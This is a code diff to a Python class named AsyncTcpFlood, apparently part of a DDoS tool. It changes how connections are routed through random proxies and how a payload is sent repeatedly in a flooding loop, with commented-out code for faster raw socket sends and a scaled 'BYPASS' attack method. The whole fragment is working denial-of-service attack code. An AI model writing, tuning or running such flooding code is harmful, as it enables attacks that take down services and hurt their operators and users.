@@ -879,7 +879,7 @@ class AsyncTcpFlood(HttpFlood):
         ssl_ctx = ctx if is_tls else None
         # setting hostname to an empty string due to https://bugs.python.org/issue27391
         server_hostname = "" if is_tls else None
-        proxy_url: str = self._proxies.pick_random() if self._proxies else None
+        proxy_url: str = self._proxies.pick_random()
         if proxy_url:
             reader, writer = await aiohttp_socks.open_connection(
                 proxy_url=proxy_url,
@@ -900,10 +900,14 @@ class AsyncTcpFlood(HttpFlood):
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=SOCK_TIMEOUT)
         self._stats.track_open_connection()
+        # XXX: testing performance of low-level API
+        # sock = writer.get_extra_info("socket")._sock
         try:
-            for _ in range(rpc):
+            for ind in range(rpc):
                 writer.write(payload)
                 await asyncio.wait_for(writer.drain(), timeout=1)
+                # XXX: testing performance of low-level API
+                # await asyncio.wait_for(self._loop.sock_sendall(sock, payload), timeout=1)
                 self._stats.track(1, packet_size)
                 packets_sent += 1
         finally:
@@ -1010,7 +1014,7 @@ class AsyncTcpFlood(HttpFlood):
     # XXX: timeout for each request
     @scale_attack(factor=3)
     async def BYPASS(self) -> bool:
-        connector = self._proxies.pick_random_connector() if self._proxies else None
+        connector = self._proxies.pick_random_connector()
         packets_sent = 0
         async with aiohttp.ClientSession(connector=connector) as s:
             self._stats.track_open_connection() # not exactly the connection though
